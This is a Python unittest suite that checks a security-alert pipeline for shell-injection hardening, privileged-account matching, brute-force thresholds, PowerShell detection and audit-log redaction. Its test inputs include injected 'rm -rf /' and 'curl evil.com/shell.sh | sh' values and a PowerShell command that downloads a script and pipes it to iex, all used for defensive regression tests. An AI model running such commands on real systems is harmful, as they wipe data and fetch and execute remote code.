import unittest
import os
import tempfile
import shutil
from typing import Dict, Any

from modules.response_simulator import ResponseSimulator
from modules.enrichment import EnrichmentModule
from modules.audit_logger import AuditLogger


class TestSecurityAndLogicHardening(unittest.TestCase):
    """Regression test suite for Phase 1, Package 1 (Security & Logic Hardening)."""

    def setUp(self):
        self.temp_dir = tempfile.mkdtemp(prefix="sec_hardening_test_")
        self.enricher = EnrichmentModule(db_config_path="config/enrichment_db.json")
        self.audit_logger = AuditLogger(log_dir=self.temp_dir, log_filename="audit_test.log")
        self.simulator = ResponseSimulator(audit_logger=self.audit_logger)

    def tearDown(self):
        if hasattr(self, "audit_logger") and self.audit_logger:
            self.audit_logger.close()
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)

    # 1. Malicious hostname/reason values cannot change command arguments (SEC-01)
    def test_malicious_values_cannot_change_command_arguments(self):
        malicious_target = "host01; rm -rf / #"
        malicious_reason = "Compromised' && curl evil.com/shell.sh | sh #"
        alert_id = "ALT-INJ-001"

        action = self.simulator.simulate_action(
            action_type="ENDPOINT_ISOLATION",
            target=malicious_target,
            reason=malicious_reason,
            alert_id=alert_id
        )

        # Verify structured argument list is primary representation
        self.assertIn("argv", action)
        argv = action["argv"]
        self.assertIsInstance(argv, list)
        self.assertEqual(argv[0], "edr_cli")
        self.assertEqual(argv[1], "isolate-host")
        self.assertEqual(argv[2], "--hostname")
        self.assertEqual(argv[3], malicious_target)
        self.assertEqual(argv[4], "--reason")
        self.assertEqual(argv[5], malicious_reason)

        # Verify recommended_command safely quotes dynamic arguments
        cmd = action["recommended_command"]
        self.assertIn("'host01; rm -rf / #'", cmd)
        self.assertEqual(cmd.count("edr_cli"), 1)

    # 2. Arbitrary substring matching false-positives eliminated (LOGIC-01)
    def test_privileged_user_arbitrary_substring_false_positives(self):
        benign_usernames = [
            "badminton",
            "radmin",
            "tina.administrative",
            "vladimir",
            "some_user_rooting_for_team"
        ]

        for username in benign_usernames:
            alert = {
                "alert_id": "T-BENIGN-01",
                "source_ip": "10.0.0.1",
                "username": username,
                "hostname": "wkst-01",
                "description": "Standard user logon event"
            }
            res = self.enricher.enrich(alert)
            self.assertFalse(
                res["is_privileged_user"],
                f"Username '{username}' should NOT be classified as privileged!"
            )

    # 3. Explicitly configured privileged accounts remain correctly classified
    def test_explicitly_configured_privileged_accounts_remain_classified(self):
        explicit_accounts = [
            "root",
            "administrator",
            "admin",
            "domain_admin",
            "svc_backup",
            "sec_ops",
            "db_admin",
            "CORP\\admin",
            "admin@corp.internal"
        ]

        for username in explicit_accounts:
            alert = {
                "alert_id": "T-PRIV-02",
                "source_ip": "10.0.0.1",
                "username": username,
                "hostname": "wkst-01",
                "description": "Logon event"
            }
            res = self.enricher.enrich(alert)
            self.assertTrue(
                res["is_privileged_user"],
                f"Configured privileged user '{username}' must be classified as privileged!"
            )

    # 4. A single failed attempt does not automatically trigger brute force (LOGIC-02)
    def test_single_failed_attempt_does_not_trigger_brute_force(self):
        # Case A: 1 failed attempt in additional_context with "failed" and "attempts" in description
        alert_single_ctx = {
            "alert_id": "T-FAIL-01",
            "source_ip": "10.0.0.1",
            "description": "Single connection failed after multiple attempts by user",
            "additional_context": {"failed_attempts_count": 1}
        }
        res_a = self.enricher.enrich(alert_single_ctx)
        self.assertFalse(res_a["is_brute_force"], "Single failed attempt must NOT trigger brute-force indicator")

        # Case B: Description mentions "failed" and "attempts" without count >= 10
        alert_desc_only = {
            "alert_id": "T-FAIL-02",
            "source_ip": "10.0.0.1",
            "description": "A description containing failed and attempts words together",
            "additional_context": {}
        }
        res_b = self.enricher.enrich(alert_desc_only)
        self.assertFalse(res_b["is_brute_force"], "Description containing 'failed' and 'attempts' alone must NOT trigger brute force")

        # Case C: Valid brute force with count >= 10
        alert_real_bf = {
            "alert_id": "T-FAIL-03",
            "source_ip": "10.0.0.1",
            "description": "50 consecutive failed SSH logins",
            "additional_context": {"failed_attempts_count": 50}
        }
        res_c = self.enricher.enrich(alert_real_bf)
        self.assertTrue(res_c["is_brute_force"], "50 failed attempts MUST trigger brute-force indicator")

    # 5. iexplore.exe does not trigger suspicious PowerShell detection
    def test_iexplore_does_not_trigger_suspicious_powershell(self):
        alert = {
            "alert_id": "T-IEX-01",
            "source_ip": "10.0.0.1",
            "description": "User launched C:\\Program Files\\Internet Explorer\\iexplore.exe to open company portal",
            "additional_context": {"process_name": "iexplore.exe"}
        }
        res = self.enricher.enrich(alert)
        self.assertFalse(res["has_suspicious_process"])
        self.assertNotIn("iex", res["suspicious_process_patterns_detected"])

    # 6. Actual suspicious PowerShell flags remain detectable
    def test_actual_suspicious_powershell_flags_remain_detectable(self):
        alert_enc = {
            "alert_id": "T-PS-01",
            "source_ip": "10.0.0.1",
            "description": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAA...",
            "additional_context": {"command_line": "powershell.exe -ExecutionPolicy Bypass -enc SQBFA..."}
        }
        res_enc = self.enricher.enrich(alert_enc)
        self.assertTrue(res_enc["has_suspicious_process"])
        self.assertIn("-enc", res_enc["suspicious_process_patterns_detected"])
        self.assertIn("bypass", res_enc["suspicious_process_patterns_detected"])

        alert_iex = {
            "alert_id": "T-PS-02",
            "source_ip": "10.0.0.1",
            "description": "powershell -Command Invoke-WebRequest http://c2.io/p.ps1 | iex",
            "additional_context": {}
        }
        res_iex = self.enricher.enrich(alert_iex)
        self.assertTrue(res_iex["has_suspicious_process"])
        self.assertIn("iex", res_iex["suspicious_process_patterns_detected"])

    # 7. Audit logs redact sensitive fields
    def test_audit_logs_redact_sensitive_fields(self):
        sensitive_payload = {
            "username": "admin",
            "password": "SuperSecretPassword123!",
            "api_key": "sk-proj-999988887777",
            "auth_token": "token_abc123xyz",
            "auth_header": "Bearer secret_jwt_token_payload",
            "nested": {
                "client_secret": "top_secret_oauth_key",
                "normal_field": "visible_value"
            }
        }

        entry = self.audit_logger.log_event(
            alert_id="ALT-SEC-001",
            stage="TEST_AUTH",
            action="CREDENTIAL_VERIFICATION",
            details=sensitive_payload
        )

        details = entry["details"]
        self.assertEqual(details["password"], "[REDACTED]")
        self.assertEqual(details["api_key"], "[REDACTED]")
        self.assertEqual(details["auth_token"], "[REDACTED]")
        self.assertEqual(details["auth_header"], "[REDACTED]")
        self.assertEqual(details["nested"]["client_secret"], "[REDACTED]")
        self.assertEqual(details["nested"]["normal_field"], "visible_value")
        self.assertEqual(details["username"], "admin")

        # Verify on-disk log file does NOT contain sensitive values
        with open(self.audit_logger.log_filepath, "r", encoding="utf-8") as f:
            log_content = f.read()

        self.assertNotIn("SuperSecretPassword123!", log_content)
        self.assertNotIn("sk-proj-999988887777", log_content)
        self.assertNotIn("token_abc123xyz", log_content)
        self.assertNotIn("top_secret_oauth_key", log_content)
        self.assertIn("[REDACTED]", log_content)

    # 8. Existing simulation-only behavior remains intact
    def test_existing_simulation_only_behavior_remains_intact(self):
        action_types = [
            ("ENDPOINT_ISOLATION", True),
            ("ACCOUNT_SUSPENSION", True),
            ("IP_BLOCK", True),
            ("ANALYST_NOTIFICATION", False),
            ("SECURITY_REVIEW_QUEUE", False)
        ]

        for act_type, expected_approval in action_types:
            action = self.simulator.simulate_action(
                action_type=act_type,
                target="target-01",
                reason="Testing simulation properties",
                alert_id="ALT-SIM-001"
            )

            self.assertEqual(action["execution_mode"], "DRY_RUN_SAFE_MODE")
            self.assertEqual(action["approval_required"], expected_approval)
            self.assertTrue(action["simulation_id"].startswith("SIM-"))
            expected_status = "SIMULATED_PENDING_APPROVAL" if expected_approval else "SIMULATED_AUTO_COMPLETED"
            self.assertEqual(action["status"], expected_status)


if __name__ == "__main__":
    unittest.main()
